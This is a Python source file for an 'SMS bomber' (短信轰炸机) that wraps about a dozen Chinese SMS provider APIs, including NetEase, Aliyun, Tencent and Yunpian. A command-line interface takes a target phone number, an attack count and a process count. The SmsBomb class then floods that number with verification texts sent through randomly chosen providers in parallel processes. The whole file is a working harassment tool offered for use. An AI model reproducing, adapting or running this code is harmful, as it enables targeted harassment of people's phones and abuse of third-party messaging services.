# coding=utf-8

import json
import time
import uuid
import argparse
import hmac
import hashlib
import requests
import random
import base64
import datetime
import urllib.parse
import importlib
import multiprocessing

__version__ = '0.0.1'
__author__ = 'iamshellvon@gmail.com'


def quote(s, safe='~'):
    """URL编码"""
    return urllib.parse.quote(s, safe=safe)


def stringify(**kwargs):
    """参见阿里云签名需要"""
    pairs = []
    for k, v in sorted(kwargs.items()):
        pairs.append('{}={}'.format(k, v))
    return '&'.join(pairs)


def canonicalize(**kwargs):
    """阿里云签名算法需要"""
    pairs = []
    for k, v in sorted(kwargs.items()):
        pair = '{}={}'.format(quote(k), quote(v))
        pairs.append(pair)
    return quote('&'.join(pairs))


def generate_random(len=6, seq=None):
    """ 生成指定长度的随机字符串.

    :param len: 需要生成的长度.
    :param seq: 需要生成的的随机字符序列,如果为None则默认为所有数字.
    :return:
    """
    if seq is None:
        import string
        seq = string.digits
    return ''.join(random.choice(seq) for _ in range(len))


class SmsBase(object):
    """短信基类"""
    API_URLS = {
        'send': 'https://von.sh'
    }

    def __init__(self, **kwargs):
        self.auth = kwargs.get('auth', {})
        self.method = kwargs.get('method', 'GET')
        self.api = kwargs.get('api', self.API_URLS['send'])
        self.desc = kwargs.get('desc')
        self.payloads = kwargs.get('payloads', {})

    def __repr__(self):
        return '<{}:{}>'.format(self.__class__.__name__, self.auth)

    def __str__(self):
        return self.__repr__()

    @property
    def nonce(self):
        return uuid.uuid4().hex

    @property
    def curtime(self):
        return str(int(time.time()))

    def send(self, mobile, **kwargs):
        self.payloads['mobile'] = mobile
        resp = requests.request(self.method, self.api, data=self.payloads)
        print(self, resp.content)
        return resp


class NeteaseSms(SmsBase):
    """
    网易云短信

    文档: http://dev.netease.im/docs/product/短信/短信接口指南
    """
    API_URLS = {
        'send': 'https://api.netease.im/sms/sendcode.action',
        'verify': 'https://api.netease.im/sms/verifycode.action',
        'send_template': 'https://api.netease.im/sms/sendtemplate.action',
        'query_status': 'https://api.netease.im/sms/querystatus.action',
    }

    def checksum(self, nonce, curtime):
        plain_text = '{0}{1}{2}'.format(
            self.auth['app_secret'], nonce, curtime).encode('utf-8')
        return hashlib.sha1(plain_text).hexdigest()

    @property
    def headers(self):
        ts = self.curtime
        nonce = self.nonce
        return {
            'AppKey': self.auth['app_key'],
            'CurTime': ts,
            'Nonce': nonce,
            "CheckSum": self.checksum(nonce, ts),
            'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
        }

    def send(self, mobile, **kwargs):
        kwargs.update({'mobile': mobile})
        resp = requests.post(
            self.api, headers=self.headers, data=kwargs).json()
        print(self, resp)
        return resp['code'] == 200


class UcpSms(SmsBase):
    """云之讯通讯

    官网: http://www.ucpaas.com/
    文档地址: http://docs.ucpaas.com/doku.php?id=%E7%9F%AD%E4%BF%A1:about_sms
    """

    API_URLS = {
        'send': 'https://open.ucpaas.com/ol/sms/sendsms',
        'send_batch': 'https://open.ucpaas.com/ol/sms/sendsms_batch'
    }

    def __init__(self, **kwargs):
        SmsBase.__init__(self, **kwargs)
        self.sid = self.auth['sid']
        self.app_id = self.auth['app_id']
        self.token = self.auth['token']

    def send(self, mobile, **kwargs):
        kwargs.update({'mobile': mobile})
        kwargs.update({
            'sid': self.sid,  # AcoountSid.
            'token': self.token,
            'appid': self.app_id,
            'mobile': str(mobile),
            'param': generate_random(6)
        })
        resp = requests.post(self.api, json=kwargs).json()
        print(self, resp)
        return resp['code'] == '000000'


class Cl253Sms(SmsBase):
    """蓝创253

    文档地址: https://www.253.com/#/document/api_doc/zz
    """

    API_URLS = {
        'send': 'http://smssh1.253.com/msg/send/json',
        'balance': 'http://smssh1.253.com/msg/balance/json',
        'variable': 'http://smssh1.253.com/msg/variable/json'
    }

    def send(self, mobile, **kwargs):
        kwargs.update({
            'account': self.auth['account'],
            'password': self.auth['password'],
            'phone': str(mobile),
            'msg': kwargs.get('msg', '您的验证码是: %s' % generate_random(6))
        })
        resp = requests.post(self.api, json=kwargs).json()
        print(self, resp)
        return resp['code'] == '0'


class AliyunSms(SmsBase):
    """阿里大鱼短信"""

    API_URLS = {
        'send': 'https://dysmsapi.aliyuncs.com'
    }

    @property
    def curtime(self):
        return datetime.datetime.utcnow().isoformat("T")

    def checksum(self, plain_text, secret_key=None):
        plain_text = plain_text.encode('utf-8')
        secret_key = secret_key if secret_key else self.auth['app_secret']
        key = (secret_key + '&').encode('utf-8')
        digest = hmac.new(key, plain_text, 'sha1').digest()
        return quote(base64.b64encode(digest))

    def _create_params(self, mobile, sign_name, template_code, template_params):
        return {
            'AccessKeyId': self.auth['app_key'],
            'Action': 'SendSms',
            'Format': 'JSON',
            'PhoneNumbers': str(mobile),
            'RegionId': 'cn-hangzhou',
            'SignName': sign_name,
            'SignatureMethod': 'HMAC-SHA1',
            'SignatureNonce': self.nonce,
            'SignatureVersion': '1.0',
            'TemplateCode': template_code,
            'TemplateParam': json.dumps(template_params),
            'Timestamp': self.curtime,
            'Version': '2017-05-25',
        }

    def send(self, mobile, **kwargs):
        params = self._create_params(
            mobile, kwargs['sign_name'], kwargs['template_code'], kwargs.get('template_params'))
        plain_text = 'POST&%2F&' + canonicalize(**params)
        sign = self.checksum(plain_text)
        body = 'Signature={}&{}'.format(sign, stringify(**params))
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp = requests.post(self.api, headers=headers,
                             data=body.encode('utf-8')).json()
        print(self, resp)

        return resp['Code'] == 'OK'


class SmsbaoSms(SmsBase):
    """短信宝

    文档: http://api.smsbao.com/
    """

    API_URLS = {
        'send': 'http://api.smsbao.com/sms',
        'voice': 'http://api.smsbao.com/voice'
    }

    ERROR_CODES = {
        0: '成功',
        30: '密码错误',
        40: '账号不存在',
        41: '余额不足',
        42: '帐号过期',
        43: 'IP地址限制',
        50: '内容含有敏感词',
        51: '手机号码不正确',
    }

    def send(self, mobile, **kwargs):
        p = hashlib.md5(self.auth['password'].encode('utf-8')).hexdigest()
        payload = {
            'u': self.auth['username'],
            'p': p,
            'c': kwargs.get('msg', '您的验证码为:233333'),
            'm': mobile
        }
        code = int(requests.get(self.api, params=payload).content)
        print(self, self.ERROR_CODES.get(code, '未知错误代码:%d' % code))
        return code == 0


class YunpianSms(SmsBase):
    """云片网

     文档: https://www.yunpian.com/doc/zh_CN/domestic/list.html
    """
    API_URLS = {
        'send': 'https://sms.yunpian.com/v2/sms/single_send.json',
        'tpl_get': 'https://sms.yunpian.com/v2/tpl/get.json',
        'tpl_create': 'https://sms.yunpian.com/v2/tpl/add.json',
    }

    def get_one_tpl(self):
        resp = requests.post(self.API_URLS['tpl_get'], {
                             'apikey': self.auth['api_key']}).json()
        return random.choice(resp)

    def send(self, mobile, **kwargs):
        payloads = {
            'mobile': mobile,
            'apikey': self.auth['api_key'],
            'text': self.get_one_tpl()['tpl_content']
        }
        resp = requests.post(self.api, data=payloads).json()
        print(self, resp)
        return resp['code'] == 0


class SubmailSms(SmsBase):
    """赛邮云通讯

    文档； https://www.mysubmail.com/chs/documents/developer/index
    """

    API_URLS = {
        'send': 'https://api.mysubmail.com/message/send'
    }

    def send(self, mobile, **kwargs):
        kwargs['to'] = mobile
        kwargs.update({
            'to': mobile,
            'content': kwargs.get('msg', kwargs.get('content')),
        })
        sign_type = kwargs.get('sign_type', 'normal')
        if sign_type == 'normal':
            pass
        elif sign_type == 'md5':
            pass
        elif sign_type == 'sha1':
            pass
        resp = super(SubmailSms, self).send(mobile, **kwargs).json()
        return resp['code'] == 0


class TencentSms(SmsBase):
    """腾讯短信

    文档: https://cloud.tencent.com/document/product/382/5976
    """

    API_URLS = {
        'send': 'https://yun.tim.qq.com/v5/tlssmssvr/sendsms',
        'tpl_get': 'https://yun.tim.qq.com/v5/tlssmssvr/get_template'
    }

    def __init__(self, **kwargs):
        SmsBase.__init__(self, **kwargs)
        self.tpl_content = kwargs.get('tpl_content', '')
        if not self.tpl_content:
            self.tpl_content = self.get_one_tpl()
        self.tpl_param = kwargs.get('tpl_params', [])

    @staticmethod
    def checksum(plain_text):
        return hashlib.sha256(plain_text).hexdigest()

    def get_one_tpl(self, tpl_id=None, tpl_page=None):
        nonce = self.nonce
        ts = self.curtime
        url = '{0}?sdkappid={1}&random={2}'.format(
            self.API_URLS['tpl_get'], self.auth['app_id'], nonce)
        plain_text = 'appkey={appkey}&random={nonce}&time={ts}'.format(
            appkey=self.auth['app_secret'],
            nonce=nonce,
            ts=ts).encode('utf-8')
        payloads = {
            'sig': self.checksum(plain_text),
            'time': ts
        }
        if tpl_id:
            payloads['tpl_id'] = tpl_id
        elif tpl_page:
            payloads['tpl_page'] = tpl_page
        if not tpl_id and not tpl_page:
            payloads['tpl_page'] = {
                'max': 10,
                'offset': 0
            }

        resp = requests.post(url, json.dumps(payloads)).json()
        return random.choice(resp['data'])['text']

    def send(self, mobile, **kwargs):
        nonce = self.nonce
        ts = self.curtime

        data = {
            'appkey': self.auth['app_secret'],
            'nonce': nonce,
            'ts': ts,
            'mobile': mobile
        }
        plain_text = 'appkey={appkey}&random={nonce}&time={ts}&mobile={mobile}'.format(
            **data).encode('utf-8')
        msg = self.tpl_content.format(None, *self.tpl_param)
        payloads = {
            "ext": "",
            "extend": "",
            "msg": msg,
            "sig": self.checksum(plain_text),
            # "sig" 字段根据公式 sha256（appkey=$appkey&random=$random&time=$time&mobile=$mobile）生成
            "tel": {
                "mobile": str(mobile),
                "nationcode": "86"
            },
            "time": int(ts),  # 请求发起时间，unix 时间戳（单位：秒），如果和系统时间相差超过 10 分钟则会返回失败
            "type": 0  # 短信类型，Enum{0: 普通短信, 1: 营销短信}（
        }

        url = '{0}?sdkappid={1}&random={2}'.format(
            self.api, self.auth['app_id'], nonce)
        resp = requests.post(url, data=json.dumps(payloads)).json()
        print(self, resp)
        return resp['result'] == 0


class MiaodiSms(SmsBase):
    """秒滴云

    文档: http://www.miaodiyun.com/doc/https_sms.html
    """

    API_URLS = {
        'send': 'https://api.miaodiyun.com/20150822/industrySMS/sendSMS'
    }

    @property
    def curtime(self):
        return time.strftime('%Y%M%d%H%m%s')

    def checksum(self, ts):
        plain_text = '{sid}{token}{ts}'.format(
            ts=ts, **self.auth).encode('utf-8')
        return hashlib.md5(plain_text).hexdigest()

    def send(self, mobile, **kwargs):
        ts = self.curtime
        kwargs.update({
            'to': mobile,
            'timestamp': ts,
            'sig': self.checksum(ts)
        })
        resp = requests.post(self.api, data=kwargs).json()
        print(self, resp)
        return resp['respCode'] == '00000'


class JuheSms(SmsBase):
    """聚合服务
    文档: https://www.juhe.cn/docs/api/id/54
    """
    API_URLS = {
        'send': 'http://v.juhe.cn/sms/send'
    }
    pass


class LuosimaoSms(SmsBase):
    """螺丝帽

    文档: https://luosimao.com/docs/api/20#send_msg
    """

    API_URLS = {
        'send': 'http://sms-api.luosimao.com/v1/send.json'
    }

    def send(self, mobile, **kwargs):
        basic_auth = ('api', 'key-%s' % self.auth['key'])
        kwargs['mobile'] = mobile
        kwargs['message'] = kwargs.get('message', kwargs.get('msg'))
        resp = requests.post(self.api, auth=basic_auth, data=kwargs).json()
        print(self, resp)
        return resp['error'] == 0


class NormalSms(SmsBase):
    """其他普通短信"""

    def __init__(self, **kwargs):
        SmsBase.__init__(self, **kwargs)
        self.headers = kwargs.get('headers')

    def send(self, target, **kwargs):
        payloads = kwargs
        payloads.update(self.auth)
        for (k, v) in payloads.items():
            if not isinstance(v, str):
                continue
            v = v.replace('{{mobile}}', str(target))
            payloads[k] = v
            v = v.replace('{{content}}', '{0}{1}'.format(
                kwargs.get('sign_name', ''), kwargs.get('msg', '')))
            payloads[k] = v

        import urllib.parse
        print(self.api, urllib.parse.urlencode(payloads))
        resp = requests.request(self.method, self.api,
                                headers=self.headers, params=payloads)
        print(self, resp.content)
        return resp.status_code == 200


def worker(*args, **kwargs):
    """
    多进程需要跑的worker.

    :param args:
    :param kwargs:
    :return:
    """
    obj, method_name = args[:2]
    return getattr(obj, method_name)(*args[2:], **kwargs)


class SmsBomb(object):
    """短信轰炸机"""

    def __init__(self, config_lst, target, limit=1, process_num=5, msg=None):
        """
        短信轰炸机!!!!

        :param config_lst: 配置列表
        :param target: 攻击目标
        :param limit:  攻击次数限制
        :param process_num: 进程数
        :param msg: 自定义消息
        """
        self.config_lst = config_lst
        self.target = target
        self.limit = limit
        self.process_num = process_num
        self.msg = msg

    def start(self, config_lst=None):
        pool = multiprocessing.Pool(processes=self.process_num)
        start_time = time.clock()
        config_lst = config_lst if config_lst else self.config_lst
        module = importlib.import_module('smsBomb')

        success_cnt = 0
        failed_cnt = 0
        while success_cnt < self.limit and (failed_cnt / self.limit) <= 0.9:
            current_config = random.choice(config_lst)
            cls_name = '{0}Sms'.format(
                current_config.get('product', '').title())
            cls = getattr(module, cls_name)(**current_config)
            payloads = current_config.get('payloads', {})
            if self.msg:
                payloads['msg'] = self.msg
            success = pool.apply(worker, args=(
                cls, 'send', self.target), kwds=payloads)
            if success:
                success_cnt += 1
            else:
                failed_cnt += 1
        pool.close()
        pool.join()
        end_time = time.clock()
        print('Time used: {0:.4f}s'.format(end_time - start_time))
        print('success: {0}, failed: {1}'.format(success_cnt, failed_cnt))


def load_config(cfg, product=None):
    """加载配置"""
    with open(cfg, 'r') as config_file:
        config = json.loads(config_file.read())
    return list(filter(None if not product else lambda x: x['product'] == product, config))


# 目前支持的短信渠道
__supported_sms_service = ['luosimao', 'submail', 'netease', 'cl253', 'ucp', 'smsbao', 'yunpian', 'normal', 'tencent',
                           'miaodi', 'juhe', 'aliyun']


def main():
    parser = argparse.ArgumentParser(description='短信轰炸机')
    parser.add_argument('-t', '--target', type=int,
                        required=True, help='指定攻击目标手机号')
    parser.add_argument('-n', '--times', type=int,
                        default=10, help='指定攻击次数,默认10')
    parser.add_argument('-p', '--product',
                        choices=__supported_sms_service,
                        type=str,
                        default=None,
                        help='使用指定产品攻击,比如网易netease/云之讯/创蓝253/腾讯云/阿里云')
    parser.add_argument('-c', '--config', type=str,
                        default='config/sms.json', help='指定配置文件')
    parser.add_argument('--process', dest='process_num',
                        type=int, default=5, help='进程数,默认5')
    parser.add_argument('-m', '--message', type=str, help='自定义的消息体,如果支持的话')
    args = parser.parse_args()
    config = load_config(args.config, args.product)
    args.process_num = min(args.process_num, args.times)

    if not config:
        print('短信轰炸机配置不可为空')
        return
    sms_bomb = SmsBomb(config, args.target, args.times,
                       args.process_num, args.message)
    sms_bomb.start()


if __name__ == '__main__':
    main()
